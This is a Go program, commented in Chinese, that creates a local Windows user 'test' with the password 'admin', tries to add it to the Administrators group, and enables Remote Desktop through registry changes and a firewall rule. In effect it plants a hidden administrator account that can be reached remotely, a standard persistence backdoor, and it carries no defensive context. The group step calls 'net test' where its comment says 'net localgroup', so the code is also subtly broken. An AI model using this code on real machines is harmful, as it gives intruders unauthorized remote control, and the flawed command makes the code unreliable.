package main

import (
	"log"
	"os/exec"
)

// createUser 用于创建新用户
func createUser(username, password string) error {
	// 执行 net user 命令创建新用户
	cmd := exec.Command("net", "user", username, password, "/add")
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("创建用户时出错: %s，输出信息: %s", err, string(output))
		return err
	}
	log.Printf("用户 %s 创建成功", username)
	return nil
}

// addUserToAdminGroup 将用户添加到管理员组
func addUserToAdminGroup(username string) error {
	// 执行 net localgroup 命令将用户添加到管理员组
	cmd := exec.Command("net", "test", "Administrators", username, "/add")
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("将用户添加到管理员组时出错: %s，输出信息: %s", err, string(output))
		return err
	}
	log.Printf("用户 %s 已添加到管理员组", username)
	return nil
}

// enableRDP 开启远程桌面协议
func enableRDP() error {
	// 执行 reg add 命令修改注册表以开启 RDP
	commands := []string{
		`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`,
		`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f`,
		`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowTSConnections /t REG_DWORD /d 1 /f`,
		`netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes`,
	}

	for _, cmdStr := range commands {
		cmd := exec.Command("cmd", "/C", cmdStr)
		output, err := cmd.CombinedOutput()
		if err != nil {
			log.Printf("执行命令 %s 时出错: %s，输出信息: %s", cmdStr, err, string(output))
			return err
		}
		log.Printf("命令 %s 执行成功", cmdStr)
	}
	log.Println("远程桌面协议已开启")
	return nil
}

func main() {
	username := "test"
	password := "admin"

	// 创建新用户
	if err := createUser(username, password); err != nil {
		return
	}

	// 将用户添加到管理员组
	if err := addUserToAdminGroup(username); err != nil {
		return
	}

	// 开启远程桌面协议
	if err := enableRDP(); err != nil {
		return
	}

	log.Println("操作完成")
}
